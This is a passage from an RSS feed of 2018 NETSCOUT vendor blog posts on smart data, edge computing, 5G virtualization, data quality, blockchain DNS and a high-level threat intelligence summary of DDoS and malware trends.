<p>The foundation for system-level telemetry is smart data, powered by <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-1-082718">NETSCOUT’s Adaptive Service Intelligence™ (ASI) technology</a>. With smart data, it is possible to analyze performance, traffic indicators, load and failures as well as offer contextual workflows to quickly triage and find the root cause of application performance degradations. Wire-data is the foundation of <a href="https://www.netscout.com/solutions/smart-data/?ls=PR-MKTG&amp;lsd=blog-2-082718">NETSCOUT’s smart data</a>: highly scalable metadata that delivers real-time and historic telemetry of all system components including physical and virtual networks, n-tier applications, workloads, protocols, servers, databases, users, and devices. Since every action and transaction is encapsulated in wire-data that traverse hybrid cloud and multi-cloud environments, it offers the best vantage point for end-to-end visibility. More so, smart data based on wire data enables an in-depth understanding of application and system performance issues, that’s independent of the source code and with no need for agents or byte code instrumentation. NETSCOUT has the only highly scalable DevOps performance monitoring solution that continuously collects, normalizes, correlates, organizes, and analyzes large volumes of wire data in a system contextual fashion.</p>

<p><a href="https://www.netscout.com/solutions/devops-monitoring?ls=PR-MKTG&amp;lsd=blog-3-082718">See how NETSCOUT’s Smart Data powered by ASI technology</a> allows DevOps and security teams to get powerful insights when they need it most, move faster when tackling big problems, and continuously demonstrate great agility when lines of business demand an outstanding customer experience in a very complex and changing digital environment. </p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/devops.jpg" length="66545" type="image/jpeg"/>
    <guid isPermaLink="false">770cebb4-dcbb-47a1-8d69-9832e7ba3cf4</guid>
    <pubDate>Fri, 24 Aug 2018 17:15:36 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Ron Lifton</dc:creator>
    </item>
<item>
  <title>Is Your Information Close Enough to the Edge?</title>
  <link>http://localhost:7996/blog/your-information-close-enough-edge</link>
  <description>Moving cloud, compute and processing power to the edge of the network will support the ultra-low latency requirements of 5G applications, such as connected cars, which run at the network edge.</description>
  <content:encoded><![CDATA[<p>Moving cloud, compute and processing power to the edge of the network will support the ultra-low latency requirements of 5G applications, such as connected cars, which run at the network edge. Service providers will use their new network architectures, which are virtualized via network functions virtualization (NFV), to deploy MEC coupled with cloud radio access network (C-RAN) systems to support these types of traffic.</p>

<p>Though the traffic journey is truncated by having intelligence at the network edge, it still needs to be managed, secured and supported by the service provider. As with traffic that travels across the entire network to a centralized server resource, service providers need visibility into the mobile edge computing traffic in order to enable full service assurance.</p>

<p>The only way to achieve this is to utilize a smart data solution which will maintain visibility throughout every aspect of the network.&nbsp; From the customer premise or IoT device over the short distance network to the MEC resource, service providers need to access and analyze this data in real time in order to gain actionable insights into how applications on the network behave. This can be used to identify security breaches, the need for greater capacity to be made available or for predictive analytics to be performed so they can smooth out the peaks and valleys in network demand from a given application or device.</p>

<p>With the network edge now a key foundation for data analytics, it is playing an ever more important part in the performance of service provider networks. What’s needed to ensure this IT infrastructure – in the form of mobile edge computing – delivers on its promises and is carrier-grade in the same way as the network that enables it – is deep visibility into the performance characteristics of the edge of the network. Virtual probes enabled by network virtualization provide the means for service providers to achieve this visibility. They can be spun up as required and configured to provide useful insights into service performance – even at the edge.</p>

<p>Children are taught to be cautious of going too close to the edge of swimming pools or cliffs, but when it comes to the network, the edge presents a compelling, yet under-exploited place to gain true operational efficiency and maximized network utilization.</p>

<p>To learn more, please&nbsp;<a href="https://www.netscout.com/nfv-smarter-video">visit our NFV Smarter page</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/mobile_edge.jpg" length="205395" type="image/jpeg"/>
    <guid isPermaLink="false">500383b1-5e3b-48db-90c0-debc6577a230</guid>
    <pubDate>Thu, 23 Aug 2018 17:36:39 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Heather  Broughton</dc:creator>
    </item>
<item>
  <title>Virtualization Picks Up the Pace for 5G Crawl, Walk, and Run Deployments</title>
  <link>http://localhost:7996/blog/virtualization-picks-pace-5g-crawl-walk-and-run-deployments</link>
  <description>The application of virtualization technologies including network functions virtualization (NFV) and software defined networking (SDN) to 5G networks is essential if 5G is to be deployed and operated at a sustainable cost.</description>
  <content:encoded><![CDATA[<p>The application of virtualization technologies including network functions virtualization (NFV) and software defined networking (SDN) to 5G networks is essential if 5G is to be deployed and operated at a sustainable cost.</p>

<p>Markets such as the U.S. and South Korea are leading the way in terms of deployments with the major service providers in both countries well advanced in their network deployments. These providers are utilizing their new 5G capacity to provide services such as fixed mobile broadband, which makes use of the 1Gbps capability that 5G offers. This has valuable enterprise applications and is supporting software defined wide area network (SD-WAN) services, which are increasingly seen as a way to achieve 5G monetization early on.</p>

<p>However, these baby steps illustrate that both virtualization and 5G are being deployed on a crawl, walk, and run basis. We’re still very much in the crawl phase, with service providers tentatively deploying both technologies in contained parts of their networks and businesses so they can learn how these technologies work and understand how to deploy them most efficiently.</p>

<p>Both technologies are reliant on a series of other technologies for their deployments to be a success. Both need tools that enable intelligent visibility into the network so clear, actionable insights can be generated to feed automated systems and enable performance to be managed and automation to be controlled. After all, power is nothing without control and virtualized network will need accurate control as a fundamental capability.</p>

<p>The good news is these tools, themselves designed as virtualized software, exist to gather data, analyze it, and present it in a way that is actionable by service providers’ other systems. Critically, the days of expensive hardware probes to reactively report on network performance are over. These are still applicable in trial phases when new networks are established, but as the scale and scope of 5G deployment accelerates towards the running phase, only software-based network assurance will be able to scale up, handle the volume of data involved, and do so at a sustainable cost.</p>

<p>The exact nature of the services of the future is still unclear and the killer apps for 5G are yet to emerge. However, universal requirements that remain the same regardless of what the services turn out to be are now apparent. They all rely on visibility into the network and gaining insights to enable predictive rather than reactive responses to network issues. Such tools also have the ability to provide immense help in setting up virtualized networks, most immediately 5G.</p>

<p>To learn more, please <a href="https://www.netscout.com/nfv-smarter-video">visit our NFV Smarter page</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/5G_virtualization.jpg" length="221225" type="image/jpeg"/>
    <guid isPermaLink="false">e413d64f-41be-4153-892a-de867c7b58b0</guid>
    <pubDate>Fri, 17 Aug 2018 15:01:10 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>What is Smart Data? How Does it Help?</title>
  <link>http://localhost:7996/blog/what-smart-data-how-does-it-help</link>
  <description>Successful data-driven businesses strive to improve data quality while reducing data organization and prep time. Read about what smart data is and how it helps.</description>
  <content:encoded><![CDATA[<p>Successful data-driven businesses strive to improve data quality while reducing data organization and prep time. The goal is to create data that is ready for analysis at speed, and the best way to do that is to make your data smart.</p>

<p>As we’ve seen, <a href="https://www.netscout.com/blog/top-data-roadblocks-digital-businesses" target="_blank" title="Top Data Roadblocks for Digital Businesses">time is already the enemy</a> of organizations driven by data due to the lag time involved in gathering and preparing data for traditional analysis. According to IDG Research’s 2016 Data and Analytics Survey, 90 percent of respondents have experienced pain points in areas such as data access, data transformation, data creation and collection, data migration, and data storage.</p>

<p>Further complicating matters, data volumes are already huge and only getting bigger, turbo-charging the rate at which data flows into the organization. While companies rely on vital intelligence from that data to optimize the user experience, few can effectively manage to pull quality data at speed from the deluge.</p>

<p>In order to wrest a full measure of worth from organizational data, you need to figure out on the fly which bits are important, make sure data quality is spot on, and add context that turns data into actionable information at the point of collection. &nbsp;When you can do that, you end up with <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="9cfd08af-be74-4c24-8fce-9813b12bf2cd" href="http://localhost:7996/solutions/smart-data" title="Smart Data Analytics">smart data</a>.</p>

<p>The difference between smart data and traditional data collection and analysis methodologies is profound, with implications for everything from improving customer experiences and operational efficiency to reducing security threats.</p>

<p><strong>How Smart Data Helps </strong></p>

<p>While smart data definitions vary somewhat, it is generally considered to be data that is prepared and organized at the collection point such that it is ready and optimized for analytics at the highest quality and speed.&nbsp;</p>

<p>Speaking at a recent conference, Donna Roy, executive director of the U.S. Department of Homeland Security’s Information Sharing and Services Office, said “her teams spend about 80% of their time just searching, ingesting, and getting data ready for analysis,” according to <a href="https://fedtechmagazine.com/article/2016/11/feds-need-turn-big-data-smart-data-dhs-official-says" target="_blank">FedTech</a>. Roy believes smart data will make it possible to take the slack out of the process and enable agencies to operate faster and smarter.</p>

<p>FedTech paraphrased Roy’s description of smart data as “data that is independent of software, applications, devices or networks but still is actionable. It’s also data that is self-describing and self-protecting. It has its own context and semantics.” That data is imbued with context, and that context is appended closer to the source of the data.</p>

<p>“Smart data means information that actually makes sense,” Wired reports in the article <a href="https://www.wired.com/insights/2013/04/big-data-fast-data-smart-data/" target="_blank">Big data, fast data, smart data</a>. “It is the difference between seeing a long list of numbers referring to weekly sales vs. identifying the peaks and troughs in sales volume over time. Algorithms turn meaningless numbers into actionable insights. Smart data is data from which signals and patterns have been extracted by intelligent algorithms.”</p>

<p>With traditional analytics, data is amassed, groomed, and then processed on some fixed schedule, say daily or weekly. That workflow means the results are often old by the time the data is considered. Smart data, on the other hand, is accessed and transformed for analytics at the point of collection which helps cut down on data prep time lag.</p>

<p>What does this mean in the business world? First and foremost, smart data helps companies pluck relevant data from the enormous volumes of data they are being flooded with. Knowing what your data is saying earlier is a huge boon in the digital world of business today. Smart data can play a critical role in a slew of activities, from healthcare monitoring and patient care to big data analytics, cloud migration, and network and application performance management. &nbsp;</p>

<p>Think, for example, of the problem cited by Bill Gillis, CIO of the Beth Israel Deaconess Care Organization in Boston in <a href="https://www.netscout.com/blog/top-data-roadblocks-digital-businesses">part one</a> of this blog. His organization wanted to get more insight into patient health using claims data, but that data is typically not available for analysis until 90 days after the event that drove the patient to the healthcare organization in the first place. That is obviously too long to react in a meaningful way, rendering the data fairy useless. If the data could be made available sooner, suddenly the organization would have a rich new source of information it could use to help patients.</p>

<p><br />
<strong>Strategic Tactics</strong>&nbsp;</p>

<p>The following considerations are important to building a smart data strategy for your company:</p>

<ul>
	<li><strong>Consider the data source.</strong> All data sources are not created equal, and it’s important to find the ones that yield the most current and relevant data. &nbsp;For example, some network monitoring tools today use unstructured machine data (log files, SNMP, etc.) that gets indexed and archived for analysis at some point. There are multiple limitations with that approach. One, it results in a ton of data that needs to be sorted through, but also only collects data that can be logged, leaving you with potential blind spots. And two, the process produces old data. Using wire data for network visibility is a better smart data bet: It gives a complete view of what is going on and done right, can be accessed, collected, and transformed in real-time.</li>
</ul>

<ul>
	<li><strong>Ensure data quality.</strong> By <a href="https://insidebigdata.com/2017/05/05/hidden-costs-bad-data/" target="_blank">some estimates</a>. bad data costs companies, on average, 12% of revenue. In fact, the old garbage in, garbage out chestnut takes on the exaggerated meaning given the critical use cases smart data is being used for, from business analytics to operation roles in data security and application performance management. You need a cohesive and consistent approach to building data quality across the organization, something that is baked into the corporate data governance handbook.</li>
</ul>

<ul>
	<li><strong>Review the need for organizational changes.</strong> Data analysis efforts tend to be centralized, but with smart data the value starts to accrue soon after the data is first assessed, meaning there are more opportunities to act—and act sooner—on data closer to the point of collection. That will have implications for both technology strategies (are you equipped to capitalize on data faster?) and the way your teams are set up to act on the data (will you need a more distributed structure to get the most of your data?).</li>
</ul>

<ul>
	<li><strong>Embrace automation.</strong> Tools that automate the collection and transformation of data are vital, and the need will only grow as you try to extract value from the ever-growing data volumes coming from an ever-increasing number of sources (read: Internet of Things). There is simply no other way to get out in front of that fire hose and expect to be able to sensibly parse and prioritize and interpret data.</li>
</ul>

<p>As noted, however, there are different ways to approach the problem. Take smart data applications for network and application performance management, which requires instrumenting the far reaches of the network for full visibility. Hardware-based approaches can prove too costly and difficult to extend to cloud-based environments. That can be a non-starter for many organizations, but since part of smart data’s value lies in being collected at the source, it’s important to find an alternative. In this case, look for software tools that will cut costs while also extending reach across mixed environments such as cloud and virtualized environments.</p>

<p>While perhaps challenging, the ultimate success of digital transformation efforts will swing on how good your data is and how fast you can act on it. Smart data promises to help you make smarter decisions faster, and the companies that do that best will be the ones that come out in front. &nbsp;</p>

<p>How is smart data being used? We’ll outline some examples of NETSCOUT Smart Data in action in the next two articles in this series.</p>

<p><em>~Written by John Dix.&nbsp; John is an IT industry veteran who has chronicled major shifts in IT since the emergence of distributed processing in the early '80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</em></p>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": {
    "@type": "Question",
    "name": "What is Smart Data?",
    "acceptedAnswer": {
      "@type": "Answer",
      "text": "While smart data definitions vary somewhat, it is generally considered to be data that is prepared and organized at the collection point such that it is ready and optimized for analytics at the highest quality and speed."
    }
  }
}
</script>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart_data_part_2.jpg" length="299996" type="image/jpeg"/>
    <guid isPermaLink="false">c813534d-5196-44cd-8572-c98045e19ddb</guid>
    <pubDate>Mon, 13 Aug 2018 14:59:34 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John Dix</dc:creator>
    </item>
<item>
  <title>Introducing NETSCOUT’s Threat Intelligence Report</title>
  <link>http://localhost:7996/blog/introducing-netscouts-threat-intelligence-report</link>
  <description>NETSCOUT’s Arbor Active Threat Level Analysis System (ATLAS®) has actively monitored the global internet threat landscape since 2007. Today, it provides us with visibility into approximately one-third of the global internet.</description>
  <content:encoded><![CDATA[<p>NETSCOUT’s Arbor Active Threat Level Analysis System (ATLAS®) has actively monitored the global internet threat landscape since 2007. Today, it provides us with visibility into approximately one-third of the global internet. With this <a href="https://www.netscout.com/threatreport">new report</a>, we’re sharing findings from our singular vantage point.</p>

<p>As threats grow across the landscape, NETSCOUT's unique position protecting enterprise networks and the&nbsp;internet through our service provider customers gives&nbsp;us wide visibility into this dynamic and ever-changing environment.&nbsp;By drawing on that comprehensive view with analysis driven by&nbsp;NETSCOUT's ATLAS&nbsp;Security Engineering &amp; Response Team (ASERT),&nbsp;we&nbsp;have created a representative&nbsp;view of the threat landscape as we observed in the first six months of 2018 based on all our data and driven by&nbsp;extensive research and analysis.</p>

<p>What did we find? The complexion of the threat landscape is moving more rapidly, expanding footprint and changing tactics. Methods that are commonplace in the DDoS threat tool kit have sprung to crimeware and espionage. This accelerating internet-scale threat paradigm changes the frontiers for where and how attacks can be launched, observed and interdicted.</p>

<p>Here are the highlights:</p>

<p><strong>1. DDoS attacks enter the terabit era</strong></p>

<p>Last winter’s Memcached-based attacks ushered in the&nbsp;terabit&nbsp;era&nbsp;of DDoS attacks.<strong>&nbsp;</strong> In fact, NETSCOUT Arbor mitigated the&nbsp;largest DDoS attack yet seen, a 1.7&nbsp;Tbps&nbsp;DDoS attack in February of 2018.</p>

<p><strong>2.&nbsp;Attack volume up, frequency down</strong></p>

<p>We saw about 2.8 billion attacks in the first half of 2018. While that’s a huge number of attacks, the big news lies in size rather than frequency.&nbsp;</p>

<p>From&nbsp;2017 to 2018,&nbsp;we saw a&nbsp;slight drop in&nbsp;attack&nbsp;frequency&nbsp;accompanied by a dramatic increase in attack size and&nbsp;scale. However, that drop in frequency doesn’t mean that DDoS attacks are abating. The maximum size of DDoS attacks&nbsp;increased 174% in H1 2018 compared with the same timeframe in 2017. It is our assessment that as&nbsp;attack tools&nbsp;grow&nbsp;more sophisticated, attackers have found&nbsp;it&nbsp;easier and cheaper to launch larger, more effective attacks.</p>

<p><strong>3. APT groups expand beyond traditional arena</strong></p>

<p>More nations are operating offensive cyber programs and we in the research community are observing a broader set of threat actors. Indeed, nation-state-sponsored activity has developed beyond the actors commonly associated with China and Russia, as our findings include campaigns attributed to Iran, North Korea and Vietnam.</p>

<p><strong>4. Crimeware actors diversify attack methods</strong></p>

<p>While email campaigns remain the primary attack venue, we observed notable changes in methods designed to accelerate malware proliferation.&nbsp;Inspired by 2017 worm&nbsp;events&nbsp;such as&nbsp;WannaCry, major&nbsp;crimeware&nbsp;groups&nbsp;added&nbsp;worm modules to other malware with distinct objectives such as credential-theft or traditional loaders. We&nbsp;also&nbsp;saw&nbsp;an increased focus on cryptocurrency mining in malware. It seems that attackers see this method as a less risky and more profitable alternative to ransomware,&nbsp;since the latter has&nbsp;the unfortunate side effect of drawing attention&nbsp;from law enforcement agencies.&nbsp;</p>

<p><strong>5. Countries can be highly targeted by DDoS campaigns</strong></p>

<p>While the trend of a large increase in size of attacks over a growth in frequency played out&nbsp;fairly&nbsp;consistently&nbsp;across regions, we saw some countries and regions disproportionately targeted. The Asia Pacific experienced a disproportionally large number of high-volume attacks in comparison with other regions. China emerged as highly targeted country, with 17 attacks greater than 500 Gbps in the first half of 2018 versus none during the same timeframe the year before.</p>

<p><strong>6. Vertical industry targets expand</strong></p>

<p>Our analysis of targeted verticals reveals some insights year over year. Telecommunications providers and hosting services continued to observe&nbsp;the&nbsp;overwhelming majority of&nbsp;attacks, but we also saw big shifts year over year in a number of vertical sectors. Attacks on system integrators and consultancies were up, and government agencies such as consulates, embassies, the International Monetary Fund, the State Department, and the United Nations experienced a sharp uptick in attacks.&nbsp;This aligns with&nbsp;the use of DDoS&nbsp;against targets by government&nbsp;as well as those ideologically opposed to the interests represented by these institutions.</p>

<p><strong>7. New DDoS attack vectors are rapidly leveraged...</strong></p>

<p>The&nbsp;Memcached&nbsp;attack campaign&nbsp;used vulnerabilities in misconfigured&nbsp;Memcached&nbsp;servers to launch enormous DDoS attacks, a process that took very little time from initial reporting to the first attack tool being made&nbsp;available and utilized to cause global impact.&nbsp; While there was considerable mobilization worldwide to fix vulnerable servers, the vector remains exploitable and will continue to be used. The reality is, once a DDoS type is invented, it never really goes away.</p>

<p><strong>8. ...While old ones get new life</strong></p>

<p>Simple Service Discovery Protocol (SSDP) has been used for reflection/amplification attacks for many years, and ASERT debunked reports this year that claimed this existing tool represented a new&nbsp; type of DDoS campaign with potentially&nbsp;millions of vulnerable devices. However, &nbsp;</p>

<p>ASERT&nbsp;<em>did</em>&nbsp;uncover a new class of SSDP abuse where&nbsp;naive&nbsp;devices will respond to SSDP reflection/amplification attacks with a non-standard port.&nbsp;The resulting flood of UDP packets has ephemeral source and destination ports, making mitigation more difficult—an SSDP diffraction attack.</p>

<p><strong>9</strong><strong>. </strong><strong>Targeted APT campaign can involve internet-scale footprints</strong></p>

<p>&nbsp;As nation-state APT groups&nbsp;continue to develop&nbsp;globally, we were particularly interested in the observations of&nbsp;internet-scale activity in the strategic sphere, where campaigns such as&nbsp;NotPetya,&nbsp;CCleaner,&nbsp;VPNFilter,&nbsp;etc.,&nbsp;involved broad proliferation across the&nbsp;internet, even as the&nbsp;ultimate&nbsp;targets&nbsp;in some instances were&nbsp;highly selective.&nbsp;These are distinct from the targeted attacks&nbsp;enterprises&nbsp;have become&nbsp;accustomed to dealing with&nbsp;over time,&nbsp;which&nbsp;often involve&nbsp;direct spear-phishing and&nbsp;limited scope to&nbsp;avoid detection and&nbsp;maintain presence.&nbsp;In this respect,&nbsp;targeted campaigns can now be backed by&nbsp;internet-scale&nbsp;intrusions</p>

<p><strong>10</strong><strong>. </strong><strong>New crimeware platforms and targets emerge</strong></p>

<p>Not satisfied with adding new malware modules, crimeware actors also busily developed new platforms, such as such as&nbsp;the Kardon&nbsp;Loader beta observed by ASERT. At the same time, well-known malware platforms such as Panda Banker are being directed at new targets.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/ThreatReport_Blog_Banner.png" length="877312" type="image/png"/>
    <guid isPermaLink="false">d538d4c8-8086-413f-90bd-085d25405298</guid>
    <pubDate>Tue, 07 Aug 2018 09:31:33 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Hardik Modi</dc:creator>
    </item>
<item>
  <title>Top Data Roadblocks for Digital Businesses</title>
  <link>http://localhost:7996/blog/top-data-roadblocks-digital-businesses</link>
  <description>Data has become the lifeblood of digitally driven businesses, as organizations look for new ways to improve customer experiences, increase operational efficiency, and create data-driven products and services. But as many companies have discovered, leveraging data is easier said than done.</description>
  <content:encoded><![CDATA[<p>Data has become the lifeblood of digitally driven businesses, as organizations look for new ways to improve customer experiences, increase operational efficiency, and create data-driven products and services.&nbsp; But as many companies have discovered, leveraging data is easier said than done.&nbsp; Data is hard to harvest efficiently, hard to secure, and the quality of the data is often suspect.&nbsp;</p>

<p>Organizations certainly have enough of it.&nbsp; <a href="https://insidebigdata.com/2017/02/16/the-exponential-growth-of-data/" target="_blank">According to an article on InsideBigData.com</a>, the digital universe is doubling every two years and will have expanded 50-fold from 2010 to 2020. &nbsp;Notes the article, “Human- and machine-generated data is experiencing an overall 10 times faster growth rate than traditional business data, and machine data is increasing even more rapidly at 50x the growth rate.” And while consumers are responsible for the bulk of the data growth today, <a href="https://www.information-age.com/data-forecast-grow-10-fold-2025-123465538/" target="_blank">IDC says</a> that by 2025 enterprises will account for 60% of new data created.</p>

<p>Some companies are already reaping the benefits of using data in new ways. By the end of last year, <a href="https://www.idc.com/promo/thirdplatform" target="_blank">IDC says</a>,“revenue growth from information-based products” was “double that of the rest of the product/service portfolio for one-third of all Fortune 500 companies.” And that’s just a taste of what is possible, adding fuel to the digital flame.&nbsp; As <a href="https://hbr.org/2016/09/do-you-know-what-your-companys-data-is-worth" target="_blank">Harvard Business Review notes</a>: “Data is no longer the domain of tech companies or IT departments — it is fast becoming a centerpiece of corporate value creation ... Data contributes not only to brand equity, but to what constitutes product and service delivery.”</p>

<p><strong>Roadblock One: Quality</strong></p>

<p>But for many companies, attaining data-driven value creation is easier said than done. Organizations struggle to leverage existing data, to say nothing of using it to launch new digital initiatives.&nbsp; In an article about data strategy, <a href="https://hbr.org/2017/05/whats-your-data-strategy" target="_blank">Harvard Business Review says</a>, “Cross-industry studies show that on average, less than half of all organization’s structured data is actively used in making decisions–and less than 1 percent of unstructured data is analyzed or used at all.”</p>

<p>With apologies to the <a href="https://www.dictionary.com/browse/water--water-everywhere----nor-any-drop-to-drink" target="_blank">Ancient Mariner</a>, “Data, data everywhere, nor any information to make decisions.”</p>

<p>Part of the problem may be issues with data quality.&nbsp; <a href="https://hbr.org/2017/09/only-3-of-companies-data-meets-basic-quality-standards" target="_blank">In a study examining the quality of corporate data that was spelled out in Harvard Business Review</a>, researchers conclude that, “on average, 47 percent of newly created data records have at least one critical (e.g., work-impacting) error … In today’s business world, work and data are inextricably tied to one another. No manager can claim that his area is functioning properly in the face of data quality issues.”</p>

<p>Estimates on the cost of bad data are eye-popping.&nbsp; <a href="https://sloanreview.mit.edu/article/seizing-opportunity-in-data-quality/" target="_blank">According to research outlined in the MIT Sloan Management Review</a>, bad data costs companies 15 percent to 25 percent of revenue. “These costs come as people accommodate bad data by correcting errors, seeking confirmation in other sources, and dealing with the inevitable mistakes that follow,” researchers say.&nbsp; “Fewer errors mean lower costs.”</p>

<p><strong>Roadblock Two: Time</strong></p>

<p>The time involved in gathering and grooming data for analysis presents another roadblock, particularly as agility remains a key success factor in the data-driven digital age.&nbsp; <a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#93cebbf6f637" target="_blank">A recent survey of data</a> scientists revealed they spend close to 80% of their time collecting data sets and cleaning and organizing data.&nbsp; That leaves precious little time for analysis and coming up with innovative ways to put data to work.</p>

<p>Indeed, even mundane data collection scenarios run into timing bottlenecks. &nbsp;<a href="https://searchcio.techtarget.com/video/CIO-says-digital-transformation-challenges-centered-on-data" target="_blank">Consider this data challenge as described to TechTarget</a> by Bill Gillis, CIO of the Beth Israel Deaconess Care Organization in Boston:</p>

<p>“In an accountable care, risk-based contract environment, the goal is to improve patient care, reduce cost, and improve overall experience. What we're trying to do is, instead of the traditional way of doing analytics in a risk environment, is look at claims data. Our biggest challenge is that claims data tends to be 90 days lagged from when the event occurred. So, if you think about that from a care perspective, [you can have] a patient who could be having a diabetic incident at his physician's practice and when you're looking at that 90 days later, that patient probably ended up in the emergency room. There's no way to really track and trend that or put a care management team to them.”</p>

<p>“What we've been trying to do is look at real-time clinical data coming out of electronic medical records. So, every night, as physicians see their patients and they sign off in their notes, we're getting that data back in our data warehouse. It's massive amounts of data, but we take that, look at it, analyze the patients and try to generate reports and give information back to teams that will allow them to interact with the patients and head off any incidents and control costs.”</p>

<p>It is all about the data, Gillis says, and the challenges are getting more intense as the data swells.</p>

<p>But the potential for data to drive remarkable change in this digital age is profound.&nbsp; “We’re in the middle of a tremendous transformation process,” <a href="https://blogs.wsj.com/cio/2017/12/04/cio-voices-volkswagens-hofmann-explains-his-principles-of-digital-transformation/" target="_blank">says Martin Hofmann, Volkswagen’s chief information officer, in a Wall Street Journal interview</a>.&nbsp; “Everyone is talking about digitalization, and Volkswagen as a group is moving from being a traditional automotive producer to a digital company, with electric vehicles, autonomous vehicles, mobility services, robotics, all of that. In the past, IT was a support function, a back-end function, a cost factor. It was never seen as a big value-add. Now, (we’re) moving to the forefront.”</p>

<p>Data is what drives it all, that makes it possible.&nbsp; And the secret to solving these roadblocks is to make your data smart.&nbsp; We’ll explore smart data in Part Two of this five-part series.</p>

<p>&nbsp;</p>

<p><em>~Written by John&nbsp;Dix.&nbsp; John is an IT industry veteran who has chronicled major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart_data_part_1.jpg" length="88521" type="image/jpeg"/>
    <guid isPermaLink="false">45388032-d284-46ad-bfee-5a2c6445c4a9</guid>
    <pubDate>Mon, 06 Aug 2018 13:44:38 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John Dix</dc:creator>
    </item>
<item>
  <title>A Kink in the Blockchain</title>
  <link>http://localhost:7996/blog/kink-blockchain</link>
  <description>As Internet of Things (IoT) devices proliferate across nearly every aspect of our personal and business lives, many of these implementations will be utilizing basic blockchain services. According to IDC, by 2019, 20 percent of all IoT deployments will have basic levels of blockchain services enabled.</description>
  <content:encoded><![CDATA[<p>As Internet of Things (IoT) devices proliferate across nearly every aspect of our personal and business lives, many of these implementations will be utilizing basic blockchain services. According to <a href="https://www.i-scoop.eu/blockchain-distributed-ledger-technology/blockchain-iot/" target="_blank">IDC</a>, by 2019, 20 percent of all IoT deployments will have basic levels of blockchain services enabled.</p>

<p>Along with the rapid growth of IoT devices comes a corresponding increase in DNS requests and DNS-dependent services. The rub here is, if DNS services are not reachable, then the blockchain essentially becomes useless, because the next part of the chain can’t be accessed. This means DNS functionality is crucial to the performance of IoT and the blockchain.</p>

<p>As highly distributed databases and applications associated with blockchain increasingly rely on complex IT infrastructures, such as private servers and virtual machines, growing resource demands put load sharing and latency in the crosshairs. Exceedingly short latencies for real-time applications, large demands on data capacities and data rates, and the need for unrestricted connectivity make <a href="https://www.netscout.com/solutions/service-assurance?ls=PR-MKTG&amp;lsd=blog-1-070518-1">service assurance</a> a business imperative. Even hybrid environments that rely on services hosted from the cloud present problems for the network and reinforce the importance of performance reliability.</p>

<p>The advent of Network Functions Virtualization (NFV) is creating a more agile network environment that is faster and better able to respond to varying loads, thus enabling new services to be rolled out much more quickly. Of course, with this greater agility also comes increased complexity in network operation and maintenance. The introduction of new services creates a higher risk of service failures. This makes it all the more important to be able to quickly identify and correct problems in virtual networks before service quality is impacted and the user experience is adversely affected.&nbsp;</p>

<p>Network monitoring and the ability to achieve service assurance is key for successful widespread deployment of narrow-band IoT (which is seen as a vital bridge technology to an eventual nationwide 5G network), blockchain and virtual networks. However, attaining service assurance in virtualized environments is no simple task. Virtual functions such as authentication services, routing and switching functions, and DNS could create heavy peak loads, which overburden networks.</p>

<p>Businesses and service providers alike will need to monitor the connections and interactions between IoT devices and the network. Service assurance solutions, such as those offered by NETSCOUT, will be critically important for identifying the root cause of errors and issues surrounding DNS performance and potential cyberattacks. Armed with these invaluable insights, IoT, virtual networks and blockchain will be able to live up to their full potential.</p>

<p>This blog is based on the article, <a href="https://www.bigdata-insider.de/blockchain-nb-iot-und-virtuelle-netzwerke-a-670712/" target="_blank"><em>Blockchain, NB-IoT and virtual networks</em></a>, which was published in Big Data Insider magazine.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/blockchain_iot.jpg" length="153588" type="image/jpeg"/>
    <guid isPermaLink="false">9bab31af-a125-4575-9052-4c66075e6b52</guid>
    <pubDate>Mon, 09 Jul 2018 18:46:26 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Are You Prepared for DDoS? (Not A Checklist)</title>
  <link>http://localhost:7996/blog/are-you-prepared-for-ddos</link>
  <description>In the 13th Annual Worldwide Infrastructure Security Report (WISR) from NETSCOUT Arbor, survey respondents were asked to identify the security measures they had in place against DDoS attacks. Among enterprise respondents, 82% identified firewalls and 57% had intrusion detection/prevention systems (IDS/IPS). In contrast, only 28% had Intelligent DDoS Mitigation Systems.</description>
